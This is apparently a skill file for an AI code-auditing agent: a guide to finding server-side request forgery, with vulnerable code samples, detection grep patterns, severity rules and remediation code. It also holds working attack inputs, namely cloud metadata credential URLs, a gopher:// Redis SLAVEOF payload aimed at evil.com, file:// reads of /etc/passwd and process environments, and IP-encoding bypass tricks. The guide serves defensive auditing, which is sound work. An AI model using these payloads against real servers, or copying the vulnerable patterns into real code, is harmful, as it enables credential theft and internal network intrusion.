<!-- Adapted audit reference. Apply its vulnerability-specific checks through the Codex-native BALLS workflow and evidence rules. -->

# Server-Side Request Forgery (SSRF) Detection Skill

## Overview

## ⚠️ Mandatory: Concrete Data Flow Proof Required

**DO NOT report a finding based on pattern-matching alone.** For every potential vulnerability you identify:

1. **Find the SINK** (dangerous function/API call)
2. **Trace all callers** — use `codegraph callers <symbol>` or `codegraph explore "<flow question>"` to identify call sites and execution paths.
3. **For each caller, trace the argument origin**:
   - Hardcoded/constant value → **Skip** (not a vulnerability, just bad practice)
   - Config file / admin-only source → **Skip** (not exploitable from internet)
   - User-controlled input (HTTP request, RPC, file upload, etc.) → **Investigate further**
   - Another service / database → **Trace upstream** to find the ultimate source
4. **Document the complete path**: SOURCE (file:line) → INTERMEDIATES (file:line each) → SINK (file:line)
5. **Verify no sanitization** between source and sink that would prevent exploitation

**"If an attacker controls X" is NOT a valid finding. You must prove X is user-controlled by tracing the actual code.**

Server-Side Request Forgery (SSRF) occurs when an attacker can induce a server-side application to make HTTP requests to an arbitrary domain, internal service, or cloud infrastructure endpoint of the attacker's choosing. The server acts as a proxy, making requests from its own network position—which is typically far more privileged than an external attacker's.

### Impact

SSRF is consistently ranked among the most critical web vulnerabilities (OWASP Top 10 2021 — A10) because it bridges the gap between external and internal networks:

- **Cloud metadata theft**: Access instance metadata services (AWS IAM credentials, GCP service account tokens, Azure managed identity tokens) leading to full cloud account compromise.
- **Internal network scanning**: Map internal services, ports, and infrastructure that are not exposed to the internet.
- **Internal service access**: Reach databases (Redis, Memcached, Elasticsearch), admin panels, and internal APIs that trust requests from the local network.
- **Data exfiltration**: Read internal files via `file://` protocol or extract data from internal services and relay it externally.
- **Remote code execution**: Chain SSRF with vulnerable internal services (e.g., unauthenticated Redis `SLAVEOF`, internal Jenkins, Solr config injection).
- **Authentication bypass**: Access services that authenticate based on source IP or network segment.

### Cloud Environment Relevance

SSRF is especially dangerous in cloud environments where the instance metadata service (IMDS) is reachable at a well-known link-local address (`169.254.169.254`). A single SSRF vulnerability can yield temporary credentials with the permissions of the instance's IAM role, potentially compromising the entire cloud account.

---

## Vulnerability Patterns

### 1. Full SSRF (Response Returned to Attacker)

The server fetches an attacker-controlled URL and returns the response content. This is the most dangerous form because the attacker can read the response.

**Python**:
```python
# VULNERABLE: User-controlled URL passed directly to requests
import requests
from flask import request as req

@app.route('/fetch')
def fetch_url():
    url = req.args.get('url')
    response = requests.get(url)          # SSRF sink
    return response.text

# VULNERABLE: urllib with user input
import urllib.request

def fetch_resource(user_url):
    resp = urllib.request.urlopen(user_url)  # SSRF sink
    return resp.read()

# VULNERABLE: httpx async client
import httpx

async def proxy_request(target_url):
    async with httpx.AsyncClient() as client:
        r = await client.get(target_url)     # SSRF sink
        return r.text
```

**Java**:
```java
// VULNERABLE: URL.openConnection with user input
String userUrl = request.getParameter("url");
URL url = new URL(userUrl);
HttpURLConnection conn = (HttpURLConnection) url.openConnection(); // SSRF sink
InputStream is = conn.getInputStream();

// VULNERABLE: HttpClient (Java 11+)
HttpClient client = HttpClient.newHttpClient();
HttpRequest req = HttpRequest.newBuilder()
    .uri(URI.create(userUrl))              // SSRF sink
    .build();
HttpResponse<String> resp = client.send(req, HttpResponse.BodyHandlers.ofString());

// VULNERABLE: Apache HttpClient
CloseableHttpClient httpClient = HttpClients.createDefault();
HttpGet httpGet = new HttpGet(userUrl);    // SSRF sink
CloseableHttpResponse response = httpClient.execute(httpGet);

// VULNERABLE: OkHttp
Request okReq = new Request.Builder().url(userUrl).build(); // SSRF sink
Response okResp = new OkHttpClient().newCall(okReq).execute();

// VULNERABLE: RestTemplate (Spring)
RestTemplate restTemplate = new RestTemplate();
String result = restTemplate.getForObject(userUrl, String.class); // SSRF sink
```

**JavaScript / Node.js**:
```javascript
// VULNERABLE: axios with user URL
const axios = require('axios');
app.get('/proxy', async (req, res) => {
    const response = await axios.get(req.query.url);  // SSRF sink
    res.send(response.data);
});

// VULNERABLE: node-fetch / global fetch
const fetch = require('node-fetch');
app.get('/fetch', async (req, res) => {
    const resp = await fetch(req.query.url);           // SSRF sink
    const body = await resp.text();
    res.send(body);
});

// VULNERABLE: native http module
const http = require('http');
http.get(userUrl, (resp) => {                          // SSRF sink
    let data = '';
    resp.on('data', (chunk) => data += chunk);
    resp.on('end', () => res.send(data));
});

// VULNERABLE: got, superagent, undici
const got = require('got');
const response = await got(userUrl);                   // SSRF sink
```

**Go**:
```go
// VULNERABLE: http.Get with user input
func handler(w http.ResponseWriter, r *http.Request) {
    targetURL := r.URL.Query().Get("url")
    resp, err := http.Get(targetURL)          // SSRF sink
    if err != nil { /* ... */ }
    defer resp.Body.Close()
    body, _ := io.ReadAll(resp.Body)
    w.Write(body)
}

// VULNERABLE: custom client
client := &http.Client{}
req, _ := http.NewRequest("GET", userURL, nil) // SSRF sink
resp, _ := client.Do(req)
```

**C#**:
```csharp
// VULNERABLE: HttpClient with user URL
var client = new HttpClient();
var response = await client.GetAsync(userUrl);         // SSRF sink
var content = await response.Content.ReadAsStringAsync();

// VULNERABLE: WebClient (legacy)
var wc = new WebClient();
string result = wc.DownloadString(userUrl);            // SSRF sink

// VULNERABLE: HttpWebRequest
var request = (HttpWebRequest)WebRequest.Create(userUrl); // SSRF sink
var response = (HttpWebResponse)request.GetResponse();

// VULNERABLE: RestSharp
var client = new RestClient(userUrl);                  // SSRF sink
var response = await client.ExecuteAsync(new RestRequest());
```

**PHP**:
```php
// VULNERABLE: file_get_contents with user URL
$url = $_GET['url'];
$content = file_get_contents($url);          // SSRF sink
echo $content;

// VULNERABLE: cURL with user URL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_GET['url']); // SSRF sink
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);

// VULNERABLE: Guzzle
$client = new \GuzzleHttp\Client();
$response = $client->get($_GET['url']);       // SSRF sink
```

**Ruby**:
```ruby
# VULNERABLE: Net::HTTP with user URL
require 'net/http'
uri = URI(params[:url])
response = Net::HTTP.get(uri)                # SSRF sink

# VULNERABLE: open-uri
require 'open-uri'
content = URI.open(params[:url]).read        # SSRF sink

# VULNERABLE: HTTParty, Faraday, RestClient
response = HTTParty.get(params[:url])        # SSRF sink
response = Faraday.get(params[:url])         # SSRF sink
response = RestClient.get(params[:url])      # SSRF sink
```

---

### 2. Blind SSRF (No Response Returned)

The server makes the request but does not return the response to the attacker. The attacker can still trigger actions on internal services and infer information from timing, DNS lookups, or out-of-band callbacks.

```python
# VULNERABLE: Webhook callback — response is not returned but request is made
@app.route('/webhooks', methods=['POST'])
def register_webhook():
    callback_url = request.json.get('callback_url')
    # URL is stored and later the server POSTs to it
    save_webhook(callback_url)  # Blind SSRF when webhook fires
    return jsonify({"status": "registered"})

# VULNERABLE: URL validation/health-check endpoint
@app.route('/check-url')
def check_url():
    url = request.args.get('url')
    try:
        requests.head(url, timeout=5)  # Blind SSRF — only status returned
        return jsonify({"reachable": True})
    except:
        return jsonify({"reachable": False})
```

```java
// VULNERABLE: Blind SSRF via notification/ping
String notifyUrl = request.getParameter("notify_url");
HttpClient client = HttpClient.newHttpClient();
HttpRequest req = HttpRequest.newBuilder()
    .uri(URI.create(notifyUrl))
    .POST(HttpRequest.BodyPublishers.ofString("event=complete"))
    .build();
client.sendAsync(req, HttpResponse.BodyHandlers.discarding()); // fire-and-forget
```

---

### 3. SSRF via PDF / Image Processing

PDF generators and image processors that render HTML or parse SVG are common SSRF vectors because they fetch external resources referenced in the content.

**HTML-to-PDF (wkhtmltopdf, Puppeteer, Playwright, WeasyPrint)**:
```python
# VULNERABLE: wkhtmltopdf rendering user-controlled HTML
import subprocess

def generate_pdf(user_html):
    # user_html could contain: <img src="http://169.254.169.254/latest/meta-data/">
    # or: <link rel="stylesheet" href="http://internal-service/admin">
    # or: <iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
    subprocess.run(['wkhtmltopdf', '-', 'output.pdf'], input=user_html.encode())
```

```javascript
// VULNERABLE: Puppeteer rendering user content
const puppeteer = require('puppeteer');

async function htmlToPdf(userHtml) {
    const browser = await puppeteer.launch();
    const page = await browser.newPage();
    await page.setContent(userHtml);  // Fetches any external resources in HTML
    const pdf = await page.pdf();
    await browser.close();
    return pdf;
}

// VULNERABLE: Puppeteer navigating to user URL
await page.goto(userUrl);  // Directly navigates to attacker-controlled URL
```

**Image Processing (ImageMagick, GraphicsMagick)**:
```python
# VULNERABLE: ImageMagick processing SVG with external references
# Attacker uploads SVG containing:
# <svg><image href="http://169.254.169.254/latest/meta-data/" /></svg>
# or: <svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml">
#        <iframe src="http://internal/"></iframe></body></foreignObject></svg>
from wand.image import Image

def process_image(uploaded_file):
    with Image(filename=uploaded_file) as img:  # SSRF if SVG with external refs
        img.format = 'png'
        img.save(filename='output.png')
```

**Dangerous HTML Tags in PDF Generation Context**:
```html
<!-- All of these can trigger SSRF in PDF/HTML renderers -->
<img src="http://169.254.169.254/latest/meta-data/">
<link rel="stylesheet" href="http://internal-service:8080/secret">
<iframe src="http://169.254.169.254/latest/user-data">
<script src="http://internal-api/graphql?query={__schema{types{name}}}"></script>
<object data="http://internal:6379/INFO">
<embed src="http://internal-service/admin">
<video src="http://internal-service/data">
<audio src="http://internal-service/data">
<source src="http://internal-service/data">
<base href="http://evil.com/">  <!-- Redirects all relative URLs -->
```

---

### 4. SSRF via Webhooks

User-configurable webhook/callback URLs are one of the most common SSRF vectors in modern applications (CI/CD, Slack integrations, payment callbacks, monitoring).

```python
# VULNERABLE: Configurable webhook destination
class WebhookConfig(db.Model):
    url = db.Column(db.String(2048))     # User-controlled URL stored in DB

def fire_webhook(event, config):
    requests.post(config.url, json=event)  # SSRF when webhook fires
```

---

### 5. Cloud Metadata Access

The primary high-impact target for SSRF in cloud environments.

**AWS (IMDSv1 — no authentication required)**:
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
```

**AWS (IMDSv2 — requires PUT request with hop-limit token)**:
```bash
# Step 1: Get token (requires PUT with custom header — harder to exploit via SSRF)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# Step 2: Use token
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
IMDSv2 mitigates basic SSRF but can still be exploited if the attacker controls headers or can make PUT requests.

**GCP**:
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
# Requires header: Metadata-Flavor: Google
```

**Azure**:
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Requires header: Metadata: true
```

**DigitalOcean**:
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/interfaces/private/0/ipv4/address
```

---

### 6. URL Parsing Differentials

Different URL parsers interpret ambiguous URLs differently. Validation in one parser may not hold when the URL is consumed by another.

```python
# Parser confusion example:
# URL: http://expected.com@evil.com/path
# Some parsers treat "expected.com" as the username and "evil.com" as the host
# Others treat "expected.com@evil.com" as the host

from urllib.parse import urlparse
parsed = urlparse("http://expected.com@evil.com/path")
# parsed.hostname == "evil.com" — but validation checked for "expected.com" in the URL

# Backslash confusion:
# URL: http://expected.com\@evil.com
# Some parsers normalize \ to / — others do not

# Fragment/query confusion:
# http://evil.com#@expected.com — which is the host?
```

```java
// Java URL class vs URI class can parse the same URL differently
URL url = new URL("http://user@expected.com:80@evil.com/");
// url.getHost() may differ from what a regex-based validator checks
```

---

### 7. DNS Rebinding

A DNS rebinding attack defeats IP-based validation by using a DNS name that initially resolves to an allowed IP but later resolves to an internal IP.

**Attack flow**:
1. Attacker registers `evil.com` with very low TTL (e.g., 0-1 second).
2. First DNS resolution: `evil.com` → `93.184.216.34` (public IP — passes validation).
3. Application validates the resolved IP is not internal. It passes.
4. Attacker changes DNS record: `evil.com` → `169.254.169.254`.
5. Application makes the actual HTTP request. DNS is re-resolved. Now points to metadata service.
6. The request reaches `169.254.169.254`, bypassing the IP check.

**Detection**: Look for TOCTOU gaps between DNS resolution/validation and the actual HTTP request.

```python
# VULNERABLE: Validates IP but then makes separate request (DNS can change between calls)
import socket, ipaddress, requests

def safe_fetch(url):
    hostname = urlparse(url).hostname
    ip = socket.gethostbyname(hostname)          # First resolution
    if ipaddress.ip_address(ip).is_private:
        raise ValueError("Internal IP blocked")
    return requests.get(url)                      # Second resolution — DNS rebinding possible
```

---

### 8. Protocol Smuggling

Many HTTP client libraries support multiple URL schemes. Attackers can use non-HTTP protocols to interact with internal services.

```
# gopher:// — arbitrary TCP data (can send Redis commands, SMTP, etc.)
gopher://internal-redis:6379/_*1%0d%0a$8%0d%0aSLAVEOF%0d%0a$12%0d%0aevil.com%0d%0a$4%0d%0a6379%0d%0a

# file:// — read local files
file:///etc/passwd
file:///proc/self/environ
file:///c:/windows/system.ini

# dict:// — query DICT servers or probe services
dict://internal-service:11211/stats

# ftp:// — interact with FTP services
ftp://internal-ftp:21/sensitive-data.txt

# ldap:// — query LDAP directories
ldap://internal-ldap/dc=example,dc=com
```

---

### 9. IP Address Bypass Patterns

When deny-lists block `127.0.0.1` or `169.254.169.254`, attackers use alternative IP representations:

```
# Decimal (single 32-bit integer)
http://2130706433        # = 127.0.0.1
http://2852039166        # = 169.254.169.254

# Octal
http://0177.0.0.1        # = 127.0.0.1
http://0251.0376.0251.0376  # = 169.254.169.254

# Hexadecimal
http://0x7f000001        # = 127.0.0.1
http://0x7f.0x0.0x0.0x1  # = 127.0.0.1
http://0xa9fea9fe        # = 169.254.169.254

# IPv6 mapped IPv4
http://[::ffff:127.0.0.1]
http://[::ffff:a9fe:a9fe]  # = 169.254.169.254

# IPv6 shorthand
http://[::1]             # localhost
http://[0:0:0:0:0:ffff:169.254.169.254]

# Mixed notation
http://127.1             # Some systems expand to 127.0.0.1
http://127.0.1           # Same

# URL encoding
http://%31%32%37%2e%30%2e%30%2e%31  # = 127.0.0.1

# Domain aliases
http://localtest.me       # Resolves to 127.0.0.1
http://spoofed.burpcollaborator.net  # Attacker-controlled DNS
http://nip.io             # Wildcard DNS: 127.0.0.1.nip.io → 127.0.0.1
http://169.254.169.254.nip.io

# Enclosed alphanumerics (Unicode normalization)
http://①②⑦.⓪.⓪.① # Some parsers normalize to 127.0.0.1
```

---

## Detection Methodology

Follow these steps systematically when scanning a codebase for SSRF vulnerabilities.

### Step 1: Find All HTTP Client Instantiation and Usage

Use these grep patterns to locate HTTP client sinks in each language:

**Python**:
```
requests\.(get|post|put|patch|delete|head|options|request)\s*\(
urllib\.request\.urlopen\s*\(
httpx\.(get|post|put|AsyncClient|Client)
aiohttp\.ClientSession
http\.client\.HTTPConnection
```

**Java**:
```
new\s+URL\s*\(
HttpClient\.(newHttpClient|newBuilder)
HttpURLConnection
RestTemplate
WebClient\.create
new\s+OkHttpClient
HttpClients\.create
new\s+HttpGet\s*\(
new\s+HttpPost\s*\(
```

**JavaScript / TypeScript**:
```
axios\.(get|post|put|patch|delete|request)\s*\(
fetch\s*\(
http\.get\s*\(|https\.get\s*\(
got\s*\(|got\.(get|post)
superagent\.(get|post)
undici\.(request|fetch)
```

**Go**:
```
http\.Get\s*\(
http\.Post\s*\(
http\.NewRequest\s*\(
client\.Do\s*\(
```

**C#**:
```
HttpClient\.(GetAsync|PostAsync|SendAsync|GetStringAsync)
WebClient\.(DownloadString|DownloadData|OpenRead)
WebRequest\.Create\s*\(
RestClient
```

**PHP**:
```
file_get_contents\s*\(
curl_setopt.*CURLOPT_URL
curl_exec\s*\(
\$client\s*->\s*(get|post|request)\s*\(
fopen\s*\(.*https?://
```

**Ruby**:
```
Net::HTTP\.(get|post|start)
URI\.open\s*\(
HTTParty\.(get|post)
Faraday\.(get|post|new)
RestClient\.(get|post)
```

### Step 2: Trace URL Parameters to HTTP Client Calls

For each HTTP client call found in Step 1:
1. Identify the URL argument (first positional argument or named URL parameter).
2. Trace backward through the code to find the origin of the URL value.
3. Determine if any component of the URL (scheme, host, port, path, query) is derived from user input.
4. Check function parameters, request parameters, database values, configuration files, and environment variables.

### Step 3: Check for URL Validation

For each user-influenced URL, examine what validation exists:

| Validation Type | Security Level | Notes |
|---|---|---|
| No validation | Critical | Direct SSRF |
| Deny-list of IPs/hosts | Weak | Bypassable via IP encoding, DNS rebinding |
| Regex on URL string | Weak | Bypassable via parser differentials |
| Allow-list of domains | Strong | Must also handle redirects |
| Resolve-then-validate IP | Moderate | Vulnerable to DNS rebinding without pinning |
| Allow-list + IP validation + no redirects | Strong | Best practice |

### Step 4: Identify Redirect Following

Most HTTP clients follow redirects by default. Even if the initial URL is validated, the redirect target may not be:

```python
# Redirect allows SSRF bypass:
# 1. Attacker hosts https://allowed-domain.com/redirect → 302 → http://169.254.169.254/
# 2. Application validates allowed-domain.com (passes)
# 3. Client follows redirect to metadata service

# Check redirect settings:
requests.get(url, allow_redirects=True)   # Default — vulnerable
requests.get(url, allow_redirects=False)  # Safer — but must handle manually
```

```java
// Java HttpClient follows redirects by default
HttpClient client = HttpClient.newBuilder()
    .followRedirects(HttpClient.Redirect.NORMAL)  // Default — vulnerable
    .build();

// Safer:
HttpClient client = HttpClient.newBuilder()
    .followRedirects(HttpClient.Redirect.NEVER)
    .build();
```

### Step 5: Check PDF/Image Generation for External Resource Loading

Search for PDF generation libraries and trace whether user-controlled content is rendered:

```
wkhtmltopdf|weasyprint|puppeteer|playwright|phantom|prince
ImageMagick|GraphicsMagick|convert\s|gm\s|wand\.image
setContent|goto|navigate|setHTML
```

### Step 6: Audit Webhook / Callback URL Configurations

Search for webhook-related patterns:
```
webhook[_\-]?url|callback[_\-]?url|notify[_\-]?url|ping[_\-]?url
endpoint[_\-]?url|destination[_\-]?url|target[_\-]?url
```

### Step 7: Look for URL Construction from User-Controlled Parts

Partial SSRF can occur when only part of the URL is user-controlled:

```python
# VULNERABLE: User controls the path — may allow path traversal or host override
base = "http://internal-api.local"
path = request.args.get('path')
url = f"{base}/{path}"
# Attacker sets path to "@evil.com" → http://internal-api.local/@evil.com
# Or path to "../../admin" to reach unintended endpoints

# VULNERABLE: User controls subdomain
subdomain = request.args.get('tenant')
url = f"http://{subdomain}.internal.corp/api"
# Attacker: subdomain = "evil.com#" → http://evil.com#.internal.corp/api
```

---

## Common Sinks and Sources

### Sources (User-Controlled Data That May Contain URLs)

| Source | Example | Risk |
|---|---|---|
| URL query parameters | `?url=http://...` | High |
| Request body (JSON/XML) | `{"webhook": "http://..."}` | High |
| HTTP headers | `X-Forwarded-For`, `Referer` | Medium |
| Webhook configuration | Admin panel webhook URL fields | High |
| Import/upload URLs | "Import from URL" features | High |
| RSS/Atom feed URLs | Feed reader subscription | High |
| Avatar/profile image URLs | User profile image URL | Medium |
| File download URLs | "Download from URL" functionality | High |
| API integration endpoints | Third-party service configuration | High |
| OAuth callback URLs | Redirect URI configuration | Medium |
| SAML/SSO metadata URLs | Identity provider metadata | Medium |
| Template variables | URL construction from user-supplied parts | Medium |
| Database-stored URLs | URLs saved by users, loaded later | High |

### Sinks (Functions That Make Server-Side Requests)

| Category | Libraries/Functions |
|---|---|
| HTTP clients | requests, urllib, httpx, axios, fetch, http.Get, HttpClient, curl |
| PDF generators | wkhtmltopdf, Puppeteer, Playwright, WeasyPrint, Prince, PDFKit |
| Image processors | ImageMagick, GraphicsMagick, Sharp (with SVG), Pillow (with SVG) |
| XML parsers | lxml, xml.etree (XXE can chain to SSRF), SAXParser |
| Email senders | SMTP libraries (if URL in email body triggers server-side rendering) |
| File operations | `open()`, `fopen()`, `file_get_contents()` (when supporting URL wrappers) |
| DNS resolution | Custom DNS lookups used before HTTP requests |
| WebSocket clients | `ws://` connections to user-controlled hosts |
| gRPC clients | Service endpoint configuration from user input |

---

## False Positive Indicators

The following patterns generally indicate a finding is NOT exploitable SSRF:

1. **Strict domain allow-list**: The URL's hostname is validated against an explicit list of allowed domains (not a substring or regex match), AND redirects are disabled or each redirect is also validated.

2. **Hardcoded URLs only**: The HTTP request is made to a fully hardcoded URL with no user-controlled components (e.g., `requests.get("http://api.internal/health")`).

3. **Scheme restriction + domain validation**: The URL scheme is restricted to `https://` only AND the domain is validated against an allow-list. Scheme restriction alone is insufficient.

4. **Network-level proxy**: All outbound requests are routed through a proxy that blocks RFC 1918, link-local, and loopback addresses AND the application cannot bypass the proxy.

5. **IMDSv2 enforced (AWS)**: When the EC2 instance has IMDSv2 enforced (`HttpTokens: required`), simple GET-based SSRF cannot retrieve metadata. However, if the attacker can control HTTP method and headers, IMDSv2 can still be exploited.

6. **URL from trusted internal configuration**: The URL is loaded from a configuration file or environment variable set by infrastructure automation, not by end users.

7. **Static asset references**: CSS/JS/image URLs that are generated by the build system and not influenced by user input.

---

## Severity Assessment

### Critical
- Full SSRF with response to attacker + cloud metadata service accessible (no IMDSv2 or IMDSv2 bypassable).
- Full SSRF with access to internal services that contain credentials, secrets, or PII.
- SSRF that can be chained to achieve RCE (e.g., via Redis, internal Jenkins).

### High
- Full SSRF limited to HTTP/HTTPS protocols but can reach internal network.
- Blind SSRF to cloud metadata endpoints.
- SSRF in PDF generation that leaks internal data in rendered output.
- Full SSRF with IMDSv2 enforced but other internal services reachable.

### Medium
- Blind SSRF to internal services (can trigger actions but cannot read responses).
- SSRF with protocol limited to HTTPS only (limits internal service access).
- Partial SSRF where only the path component is user-controlled.
- SSRF in image processing with limited data extraction capability.

### Low
- SSRF to external URLs only (no internal network access) with redirect following disabled.
- Blind SSRF to external URLs (can only confirm reachability).
- SSRF with effective network-level controls (egress proxy) that block internal access but might be bypassed by future network changes.

---

## Remediation Patterns

### 1. URL Allow-Listing (Recommended)

```python
# SAFE: Allow-list of permitted domains
ALLOWED_HOSTS = {"api.example.com", "cdn.example.com"}

def safe_fetch(url):
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("Invalid scheme")
    if parsed.hostname not in ALLOWED_HOSTS:
        raise ValueError("Host not allowed")
    return requests.get(url, allow_redirects=False)
```

### 2. Disable Redirect Following

```python
# Validate each redirect manually
response = requests.get(url, allow_redirects=False)
if response.is_redirect:
    redirect_url = response.headers['Location']
    validate_url(redirect_url)  # Re-validate the redirect target
```

### 3. DNS Resolution Validation (With Pinning)

```python
# Resolve DNS first, validate the IP, then connect to the resolved IP directly
import socket, ipaddress

def ssrf_safe_fetch(url):
    parsed = urlparse(url)
    hostname = parsed.hostname

    # Resolve and validate
    ip = socket.gethostbyname(hostname)
    ip_obj = ipaddress.ip_address(ip)
    if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:
        raise ValueError(f"Blocked internal IP: {ip}")

    # Connect directly to validated IP (prevents DNS rebinding)
    # Use the resolved IP but set Host header to original hostname
    pinned_url = url.replace(hostname, ip)
    return requests.get(pinned_url, headers={"Host": hostname}, allow_redirects=False)
```

### 4. Network-Level Controls

- Route all outbound requests through a dedicated egress proxy.
- The proxy should block connections to: RFC 1918 ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), link-local (`169.254.0.0/16`), loopback (`127.0.0.0/8`), and IPv6 equivalents.
- Use network security groups / firewall rules to restrict the application's outbound access.

### 5. IMDSv2 Enforcement (AWS)

```bash
# Enforce IMDSv2 on all EC2 instances
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-put-response-hop-limit 1
```
Set `--http-put-response-hop-limit 1` to prevent containers or Docker from reaching IMDS through additional network hops.

### 6. Protocol Restriction

```python
# Only allow https:// scheme
parsed = urlparse(url)
if parsed.scheme != "https":
    raise ValueError("Only HTTPS URLs are permitted")
```

### 7. SSRF-Safe HTTP Client Wrapper

```python
# Centralized wrapper that enforces all SSRF protections
import ipaddress, socket, requests
from urllib.parse import urlparse

BLOCKED_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),
    ipaddress.ip_network('::1/128'),
    ipaddress.ip_network('fc00::/7'),
    ipaddress.ip_network('fe80::/10'),
]

def is_blocked_ip(ip_str):
    ip = ipaddress.ip_address(ip_str)
    return any(ip in network for network in BLOCKED_RANGES)

def ssrf_safe_request(method, url, **kwargs):
    parsed = urlparse(url)
    if parsed.scheme not in ('http', 'https'):
        raise ValueError(f"Blocked scheme: {parsed.scheme}")

    hostname = parsed.hostname
    for info in socket.getaddrinfo(hostname, parsed.port or 443):
        ip = info[4][0]
        if is_blocked_ip(ip):
            raise ValueError(f"Blocked internal IP: {ip}")

    kwargs['allow_redirects'] = False
    return requests.request(method, url, **kwargs)
```

---

## CWE References

| CWE | Description | Relevance |
|---|---|---|
| **CWE-918** | Server-Side Request Forgery (SSRF) | Primary classification for all SSRF vulnerabilities |
| **CWE-611** | Improper Restriction of XML External Entity Reference (XXE) | XXE can be chained to perform SSRF via external entity resolution |
| **CWE-441** | Unintended Proxy or Intermediary ('Confused Deputy') | SSRF is a form of confused deputy where the server acts as an unintended proxy |
| CWE-20 | Improper Input Validation | Root cause — insufficient validation of user-supplied URLs |
| CWE-601 | URL Redirection to Untrusted Site | Open redirects can be chained with SSRF for validation bypass |

---

## Additional References

- OWASP SSRF Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- PortSwigger SSRF Research: https://portswigger.net/web-security/ssrf
- HackTricks SSRF: https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
- Orange Tsai — A New Era of SSRF: URL Parser Confusion in Various Languages
